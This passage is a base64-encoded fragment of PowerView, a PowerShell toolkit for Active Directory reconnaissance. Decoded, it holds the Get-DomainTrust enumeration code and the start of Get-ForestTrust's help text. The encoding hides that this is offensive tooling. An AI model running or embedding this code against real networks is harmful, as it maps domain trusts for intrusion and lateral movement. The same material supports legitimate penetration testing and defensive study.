V0ZXJTZXROYW1lID0gJ0FQSScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEFQSSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ05FVCcpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJE5FVCwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0xEQVAnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0FQSScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnTERBUCcpXQogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbQWxpYXMoJ1JldHVybk9uZScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZpbmRPbmUsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdMREFQJyldCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgICRUcnVzdEF0dHJpYnV0ZXMgPSBAewogICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDAxJyA9ICdOT05fVFJBTlNJVElWRScKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAwMicgPSAnVVBMRVZFTF9PTkxZJwogICAgICAgICAgICBbdWludDMyXScweDAwMDAwMDA0JyA9ICdGSUxURVJfU0lEUycKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAwOCcgPSAnRk9SRVNUX1RSQU5TSVRJVkUnCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwMTAnID0gJ0NST1NTX09SR0FOSVpBVElPTicKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDAyMCcgPSAnV0lUSElOX0ZPUkVTVCcKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDA0MCcgPSAnVFJFQVRfQVNfRVhURVJOQUwnCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAwODAnID0gJ1RSVVNUX1VTRVNfUkM0X0VOQ1JZUFRJT04nCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAxMDAnID0gJ1RSVVNUX1VTRVNfQUVTX0tFWVMnCiAgICAgICAgICAgIFt1aW50MzJdJzB4MDAwMDAyMDAnID0gJ0NST1NTX09SR0FOSVpBVElPTl9OT19UR1RfREVMRUdBVElPTicKICAgICAgICAgICAgW3VpbnQzMl0nMHgwMDAwMDQwMCcgPSAnUElNX1RSVVNUJwogICAgICAgIH0KCiAgICAgICAgJExkYXBTZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRMZGFwU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7ICRMZGFwU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9wZXJ0aWVzJ10pIHsgJExkYXBTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJFByb3BlcnRpZXMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkTGRhcFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJExkYXBTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRMZGFwU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJExkYXBTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJExkYXBTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkTGRhcFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkTGRhcFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRQc0NtZGxldC5QYXJhbWV0ZXJTZXROYW1lIC1uZSAnQVBJJykgewogICAgICAgICAgICAkTmV0U2VhcmNoZXJBcmd1bWVudHMgPSBAe30KICAgICAgICAgICAgaWYgKCREb21haW4gLWFuZCAkRG9tYWluLlRyaW0oKSAtbmUgJycpIHsKICAgICAgICAgICAgICAgICRTb3VyY2VEb21haW4gPSAkRG9tYWluCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgICAgICAgICAkU291cmNlRG9tYWluID0gKEdldC1Eb21haW4gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwpLk5hbWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRTb3VyY2VEb21haW4gPSAoR2V0LURvbWFpbikuTmFtZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLW5lICdORVQnKSB7CiAgICAgICAgICAgIGlmICgkRG9tYWluIC1hbmQgJERvbWFpbi5UcmltKCkgLW5lICcnKSB7CiAgICAgICAgICAgICAgICAkU291cmNlRG9tYWluID0gJERvbWFpbgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJFNvdXJjZURvbWFpbiA9ICRFbnY6VVNFUkROU0RPTUFJTgogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWVxICdMREFQJykgewogICAgICAgICAgICAjIGlmIHdlJ3JlIHNlYXJjaGluZyBmb3IgZG9tYWluIHRydXN0cyB0aHJvdWdoIExEQVAvQURTSQogICAgICAgICAgICAkVHJ1c3RTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBATGRhcFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICRTb3VyY2VTSUQgPSBHZXQtRG9tYWluU0lEIEBOZXRTZWFyY2hlckFyZ3VtZW50cwoKICAgICAgICAgICAgaWYgKCRUcnVzdFNlYXJjaGVyKSB7CgogICAgICAgICAgICAgICAgJFRydXN0U2VhcmNoZXIuRmlsdGVyID0gJyhvYmplY3RDbGFzcz10cnVzdGVkRG9tYWluKScKCiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGaW5kT25lJ10pIHsgJFJlc3VsdHMgPSAkVHJ1c3RTZWFyY2hlci5GaW5kT25lKCkgfQogICAgICAgICAgICAgICAgZWxzZSB7ICRSZXN1bHRzID0gJFRydXN0U2VhcmNoZXIuRmluZEFsbCgpIH0KICAgICAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJFByb3BzID0gJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCA9IE5ldy1PYmplY3QgUFNPYmplY3QKCiAgICAgICAgICAgICAgICAgICAgJFRydXN0QXR0cmliID0gQCgpCiAgICAgICAgICAgICAgICAgICAgJFRydXN0QXR0cmliICs9ICRUcnVzdEF0dHJpYnV0ZXMuS2V5cyB8IFdoZXJlLU9iamVjdCB7ICRQcm9wcy50cnVzdGF0dHJpYnV0ZXNbMF0gLWJhbmQgJF8gfSB8IEZvckVhY2gtT2JqZWN0IHsgJFRydXN0QXR0cmlidXRlc1skX10gfQoKICAgICAgICAgICAgICAgICAgICAkRGlyZWN0aW9uID0gU3dpdGNoICgkUHJvcHMudHJ1c3RkaXJlY3Rpb24pIHsKICAgICAgICAgICAgICAgICAgICAgICAgMCB7ICdEaXNhYmxlZCcgfQogICAgICAgICAgICAgICAgICAgICAgICAxIHsgJ0luYm91bmQnIH0KICAgICAgICAgICAgICAgICAgICAgICAgMiB7ICdPdXRib3VuZCcgfQogICAgICAgICAgICAgICAgICAgICAgICAzIHsgJ0JpZGlyZWN0aW9uYWwnIH0KICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICRUcnVzdFR5cGUgPSBTd2l0Y2ggKCRQcm9wcy50cnVzdHR5cGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgMSB7ICdXSU5ET1dTX05PTl9BQ1RJVkVfRElSRUNUT1JZJyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDIgeyAnV0lORE9XU19BQ1RJVkVfRElSRUNUT1JZJyB9CiAgICAgICAgICAgICAgICAgICAgICAgIDMgeyAnTUlUJyB9CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAkRGlzdGluZ3Vpc2hlZG5hbWUgPSAkUHJvcHMuZGlzdGluZ3Vpc2hlZG5hbWVbMF0KICAgICAgICAgICAgICAgICAgICAkU291cmNlTmFtZUluZGV4ID0gJERpc3Rpbmd1aXNoZWRuYW1lLkluZGV4T2YoJ0RDPScpCiAgICAgICAgICAgICAgICAgICAgaWYgKCRTb3VyY2VOYW1lSW5kZXgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNvdXJjZURvbWFpbiA9ICQoJERpc3Rpbmd1aXNoZWRuYW1lLlN1YlN0cmluZygkU291cmNlTmFtZUluZGV4KSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNvdXJjZURvbWFpbiA9ICIiCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0TmFtZUluZGV4ID0gJERpc3Rpbmd1aXNoZWRuYW1lLkluZGV4T2YoJyxDTj1TeXN0ZW0nKQogICAgICAgICAgICAgICAgICAgIGlmICgkU291cmNlTmFtZUluZGV4KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRUYXJnZXREb21haW4gPSAkRGlzdGluZ3Vpc2hlZG5hbWUuU3ViU3RyaW5nKDMsICRUYXJnZXROYW1lSW5kZXgtMykKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRUYXJnZXREb21haW4gPSAiIgogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgJE9iamVjdEd1aWQgPSBOZXctT2JqZWN0IEd1aWQgQCgsJFByb3BzLm9iamVjdGd1aWRbMF0pCiAgICAgICAgICAgICAgICAgICAgJFRhcmdldFNJRCA9IChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCRQcm9wcy5zZWN1cml0eWlkZW50aWZpZXJbMF0sMCkpLlZhbHVlCgogICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTb3VyY2VOYW1lJyAkU291cmNlRG9tYWluCiAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RhcmdldE5hbWUnICRQcm9wcy5uYW1lWzBdCiAgICAgICAgICAgICAgICAgICAgIyAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVGFyZ2V0R3VpZCcgInskT2JqZWN0R3VpZH0iCiAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RydXN0VHlwZScgJFRydXN0VHlwZQogICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUcnVzdEF0dHJpYnV0ZXMnICQoJFRydXN0QXR0cmliIC1qb2luICcsJykKICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVHJ1c3REaXJlY3Rpb24nICIkRGlyZWN0aW9uIgogICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdXaGVuQ3JlYXRlZCcgJFByb3BzLndoZW5jcmVhdGVkWzBdCiAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1doZW5DaGFuZ2VkJyAkUHJvcHMud2hlbmNoYW5nZWRbMF0KICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkRvbWFpblRydXN0LkxEQVAnKQogICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluVHJ1c3RdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6ICRfIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRUcnVzdFNlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgLWVxICdBUEknKSB7CiAgICAgICAgICAgICMgaWYgd2UncmUgc2VhcmNoaW5nIGZvciBkb21haW4gdHJ1c3RzIHRocm91Z2ggV2luMzIgQVBJIGZ1bmN0aW9ucwogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgewogICAgICAgICAgICAgICAgJFRhcmdldERDID0gJFNlcnZlcgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJERvbWFpbiAtYW5kICREb21haW4uVHJpbSgpIC1uZSAnJykgewogICAgICAgICAgICAgICAgJFRhcmdldERDID0gJERvbWFpbgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgIyBzZWUgaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9tczY3NTk3Nih2PXZzLjg1KS5hc3B4IGZvciBkZWZhdWx0IE5VTEwgYmVoYXZpb3IKICAgICAgICAgICAgICAgICRUYXJnZXREQyA9ICROdWxsCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgYXJndW1lbnRzIGZvciBEc0VudW1lcmF0ZURvbWFpblRydXN0cwogICAgICAgICAgICAkUHRySW5mbyA9IFtJbnRQdHJdOjpaZXJvCgogICAgICAgICAgICAjIDYzID0gRFNfRE9NQUlOX0lOX0ZPUkVTVCArIERTX0RPTUFJTl9ESVJFQ1RfT1VUQk9VTkQgKyBEU19ET01BSU5fVFJFRV9ST09UICsgRFNfRE9NQUlOX1BSSU1BUlkgKyBEU19ET01BSU5fTkFUSVZFX01PREUgKyBEU19ET01BSU5fRElSRUNUX0lOQk9VTkQKICAgICAgICAgICAgJEZsYWdzID0gNjMKICAgICAgICAgICAgJERvbWFpbkNvdW50ID0gMAoKICAgICAgICAgICAgIyBnZXQgdGhlIHRydXN0IGluZm9ybWF0aW9uIGZyb20gdGhlIHRhcmdldCBzZXJ2ZXIKICAgICAgICAgICAgJFJlc3VsdCA9ICROZXRhcGkzMjo6RHNFbnVtZXJhdGVEb21haW5UcnVzdHMoJFRhcmdldERDLCAkRmxhZ3MsIFtyZWZdJFB0ckluZm8sIFtyZWZdJERvbWFpbkNvdW50KQoKICAgICAgICAgICAgIyBMb2NhdGUgdGhlIG9mZnNldCBvZiB0aGUgaW5pdGlhbCBpbnRQdHIKICAgICAgICAgICAgJE9mZnNldCA9ICRQdHJJbmZvLlRvSW50NjQoKQoKICAgICAgICAgICAgIyAwID0gc3VjY2VzcwogICAgICAgICAgICBpZiAoKCRSZXN1bHQgLWVxIDApIC1hbmQgKCRPZmZzZXQgLWd0IDApKSB7CgogICAgICAgICAgICAgICAgIyBXb3JrIG91dCBob3cgbXVjaCB0byBpbmNyZW1lbnQgdGhlIHBvaW50ZXIgYnkgZmluZGluZyBvdXQgdGhlIHNpemUgb2YgdGhlIHN0cnVjdHVyZQogICAgICAgICAgICAgICAgJEluY3JlbWVudCA9ICREU19ET01BSU5fVFJVU1RTOjpHZXRTaXplKCkKCiAgICAgICAgICAgICAgICAjIHBhcnNlIGFsbCB0aGUgcmVzdWx0IHN0cnVjdHVyZXMKICAgICAgICAgICAgICAgIGZvciAoJGkgPSAwOyAoJGkgLWx0ICREb21haW5Db3VudCk7ICRpKyspIHsKICAgICAgICAgICAgICAgICAgICAjIGNyZWF0ZSBhIG5ldyBpbnQgcHRyIGF0IHRoZSBnaXZlbiBvZmZzZXQgYW5kIGNhc3QgdGhlIHBvaW50ZXIgYXMgb3VyIHJlc3VsdCBzdHJ1Y3R1cmUKICAgICAgICAgICAgICAgICAgICAkTmV3SW50UHRyID0gTmV3LU9iamVjdCBTeXN0ZW0uSW50cHRyIC1Bcmd1bWVudExpc3QgJE9mZnNldAogICAgICAgICAgICAgICAgICAgICRJbmZvID0gJE5ld0ludFB0ciAtYXMgJERTX0RPTUFJTl9UUlVTVFMKCiAgICAgICAgICAgICAgICAgICAgJE9mZnNldCA9ICROZXdJbnRQdHIuVG9JbnQ2NCgpCiAgICAgICAgICAgICAgICAgICAgJE9mZnNldCArPSAkSW5jcmVtZW50CgogICAgICAgICAgICAgICAgICAgICRTaWRTdHJpbmcgPSAnJwogICAgICAgICAgICAgICAgICAgICRSZXN1bHQgPSAkQWR2YXBpMzI6OkNvbnZlcnRTaWRUb1N0cmluZ1NpZCgkSW5mby5Eb21haW5TaWQsIFtyZWZdJFNpZFN0cmluZyk7JExhc3RFcnJvciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQoKICAgICAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdCAtZXEgMCkgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblRydXN0XSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkTGFzdEVycm9yKS5NZXNzYWdlKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NvdXJjZU5hbWUnICRTb3VyY2VEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RhcmdldE5hbWUnICRJbmZvLkRuc0RvbWFpbk5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RhcmdldE5ldGJpb3NOYW1lJyAkSW5mby5OZXRiaW9zRG9tYWluTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnRmxhZ3MnICRJbmZvLkZsYWdzCiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdQYXJlbnRJbmRleCcgJEluZm8uUGFyZW50SW5kZXgKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RydXN0VHlwZScgJEluZm8uVHJ1c3RUeXBlCiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUcnVzdEF0dHJpYnV0ZXMnICRJbmZvLlRydXN0QXR0cmlidXRlcwogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluVHJ1c3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVGFyZ2V0U2lkJyAkU2lkU3RyaW5nCiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUYXJnZXRHdWlkJyAkSW5mby5Eb21haW5HdWlkCiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW5UcnVzdC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuRG9tYWluVHJ1c3QuQVBJJykKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblRydXN0CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgIyBmcmVlIHVwIHRoZSByZXN1bHQgYnVmZmVyCiAgICAgICAgICAgICAgICAkTnVsbCA9ICROZXRhcGkzMjo6TmV0QXBpQnVmZmVyRnJlZSgkUHRySW5mbykKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluVHJ1c3RdIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRSZXN1bHQpLk1lc3NhZ2UpIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAjIGlmIHdlJ3JlIHNlYXJjaGluZyBmb3IgZG9tYWluIHRydXN0cyB0aHJvdWdoIC5ORVQgbWV0aG9kcwogICAgICAgICAgICAkRm91bmREb21haW4gPSBHZXQtRG9tYWluIEBOZXRTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICBpZiAoJEZvdW5kRG9tYWluKSB7CiAgICAgICAgICAgICAgICAkRm91bmREb21haW4uR2V0QWxsVHJ1c3RSZWxhdGlvbnNoaXBzKCkgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJF8uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkRvbWFpblRydXN0Lk5FVCcpCiAgICAgICAgICAgICAgICAgICAgJF8KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Gb3Jlc3RUcnVzdCB7CjwjCi5TWU5PUFNJUwoKUmV0dXJuIGFsbCBmb3Jlc3QgdHJ1c3RzIGZvciB0aGUgY3VycmVudCBmb3Jlc3Qgb3IgYSBzcGVjaWZpZWQgZm9yZXN0LgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRm9yZXN0ICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiB3aWxsIGVudW1lcmF0ZSBkb21haW4gdHJ1c3QgcmVsYXRpb25zaGlwcyBmb3IgdGhlIGN1cnJlbnQgKG9yIGEgcmVtb3RlKQpmb3Jlc3QgdXNpbmcgbnVtYmVyIG9mIG1ldGhvZCB1c2luZyB0aGUgLk5FVCBtZXRob2QgR2V0QWxsVHJ1c3RSZWxhdGlvbnNoaXBzKCkgb24gYQpTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkZvcmVzdCByZXR1cm5lZCBieSBHZXQtRm9yZXN0LgoKLlBBUkFNRVRFUiBGb3Jlc3QKClNwZWNpZmllcyB0aGUgZm9yZXN0IHRvIHF1ZXJ5IGZvciB0cnVzdHMsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGZvcmVzdC4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRm9yZXN0VHJ1c3QKClJldHVybiBjdXJyZW50IGZvcmVzdCB0cnVzdHMuCgouRVhBTVBMRQoKR2V0LUZvcmVzdFRydXN0IC1Gb3Jlc3QgImV4dGVybmFsLmxvY2FsIgoKUmV0dXJuIHRydXN0cyBmb3IgdGhlICJleHRlcm5hbC5sb2NhbCIgZm9yZXN0LgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZ